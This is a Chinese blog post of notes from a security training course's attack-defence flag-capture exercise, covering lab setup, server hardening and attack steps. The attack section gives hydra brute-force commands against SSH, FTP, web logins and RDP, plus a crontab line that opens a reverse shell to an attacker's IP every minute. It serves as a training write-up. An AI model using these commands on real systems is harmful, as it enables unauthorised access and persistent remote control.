---
title: 【网络安全1x09】安恒厂家网络安全培训 --- day9、day10
date: 2020-07-10 22:55:08
tags: [网络安全, kali, vulhub]
---

这两天进行攻防演练。

第一天搭建环境，winserver物理机+vulhub虚拟机，物理机存在漏洞，物理机搭建cms存在漏洞，vulhub存在漏洞，另外再开启三个漏洞docker。共藏5个flag（物理机1，虚拟机1，docker3）。

第二天进行攻防演练，默认弱口令，攻击其它队伍服务器获取flag，修补自己服务器保护flag。

<!-- more -->

# 环境搭建

记录几个坑。

* 安装win2008要注意选择**企业版**，默认安装的**数据中心版**只有命令行。

* win2012R2上安装VMWare15时提示更新KB2919355，这是因为Windows2012R2缺少两个更新补丁，请按照顺序进行更新：

	1. 安装KB2975061更新：https://www.microsoft.com/zh-CN/download/details.aspx?id=43531
	2. 安装KB2919355更新（只选择下载安装KB2919355更新即可）：https://www.microsoft.com/zh-CN/download/details.aspx?id=42334

* kali桥接默认配置得不到地址：

1. vm中`编辑-->编辑虚拟网卡`选择`vmet0`桥接至物理机在使用的网卡。
2. kali编辑网口信息`vi /etc/network/interfaces`：
``` bash
auto eth0
iface eth0 inet static
address [ip]
netmask [mask]
gateway [gw]
```
3. 配置DNS（如果需要）`vi /etc/resolv.conf`：
``` bash
# Generated by NetworkManager
domain
nameserver [dns]
```
4. 重启网络`/etc/init.d/networking restart`。


# 攻防演练

## 防

### 物理机

1. `控制面板 - 用户账户 - 删除用户账户`查看是否有未知用户。

2. 如果可操作服务器实机，也可直接`计算机 - 右键属性 - 远程设置 - 关闭远程连接`。

3. 网站后台登录改密码。

4. 网站物理目录修改后台页面域名（未确认是否违规）。

5. 网站目录下放置了flag的话，到`httpd.conf`增加权限，避免被扫出明文：

``` bash
<Files ~ "flag.txt">
Order allow,deny
Deny from all
</Files>
```

6. 配合攻击，每攻成功一个漏洞，可以seay直接找到源码对应位置修补。

### 虚拟机

1. 修改弱口令：

``` bash
sudo passwd [user]
```

2. 踢出其它在线用户：

``` bash
#查看当前在线用户
w 

#踢出其它用户，例pts/0，自身是tty
pkill -kill -t [user]
```

3. 查看用户组是否有新增未知用户：

``` bash
#新增用户一般在最后一行，工作目录是/home/[user]的那个
cat /etc/passwd

#删除用户，需要踢出才能删
deluser [user]
```

4. 查登录日志：

``` bash
last
```

5. 查自身活动端口：

``` bash
netstat -pantu
```

6. 查端口服务：

``` bash
nmap -sV -p- -T4 [ip]
```

### vulhub

1. 查看启动docker进程：

``` bash
# 活动容器
docker ps

# 全部容器
docker ps -a
```

2. 进入容器修漏洞：

``` bash
#方法一
docker exec -it [容器id] /bin/bash

#方法二
cd [docker目录]
docker-compose exec [容器名称] bash
```

3. 修补完漏洞重启容器生效：

``` bash
docker restart [容器id]
```

**相关CVE漏洞修复指南：**

* [Tomcat7+ Weak Password && Backend Getshell Vulnerability](http://got17.cn/1078/)
* [CNVD-2020-10487(CVE-2020-1938)tomcat ajp 文件读取漏洞](http://got17.cn/1078/)
* [Weblogic  10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞（CVE-2017-10271）](http://got17.cn/1079/)
* [ActiveMQ反序列化漏洞（CVE-2015-5254）](http://got17.cn/1079/)
* [Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）](http://got17.cn/1080/)
* [Weblogic weak password](http://got17.cn/1080/)

**另外可提前把相关漏洞修复文件、脚本、命令准备好，漏洞一确定即可立马修复。**

## 攻

### hydra破解弱口令

2011-2019年Top100弱口令密码字典 Top1000密码字典 服务器SSH/VPS密码字典 后台管理密码字典 数据库密码字典：

https://github.com/k8gege/PasswordDic

破解命令：

``` bash
1、破解ssh： 
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh 
hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh 


2、破解ftp： 
hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV 
hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV 


3、get方式提交，破解web登录： 
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/ 
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php


4、post方式提交，破解web登录： 
hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password" 
hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>" 
（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中 的内容是表示错误猜解的返回信息提示。） 


4、破解https： 
hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https 


5、破解rdp： 
hydra ip rdp -l administrator -P pass.txt -V 
```

kali远程连接3389：

``` bash
rdesktop -f -a 16 [IP]:3389
```

### ssh连接

开局抢速度，在还未来得及更改密码前登上其他队服务器，全局搜flag：

``` bash
find / -name flag.txt
```

为避免被踢下线/删用户，暂时想到两个方法，一个是往`/etc/crontab`加个每分钟反弹shell的定时任务：

``` bash
echo '*/1 * * * * root echo "bash -i >& /dev/tcp/[ip]/[port] 0>&1" | bash -i' >> /etc/crontab
```

另外一个是直接放个脚本，死循环反弹shell。

有待测试。

### docker漏洞

提前按CVE建好文件夹，备好攻击用脚本、命令，一旦确定漏洞还未修复，直接复制粘贴攻击抢手速。

### 文件上传漏洞

找上传点，burpsuite抓包，改后缀、改文件类型、加图片文件头，一步一步来，传上去的同时还能知道怎么修。

seay审计源码，直接搜相应函数，对判断的函数加条件，或者直接拒绝一切条件（可能违规）。

### xss漏洞

找带框的一个个试，暂时只能想，而且即使找到了也不太会用。

### sql注入

网站里各种点点点，找到类似`[url]/?id=`的路径，丢到sqlmap里跑，带cookie的burpsuite抓个包，保存本地再丢给sqlmap。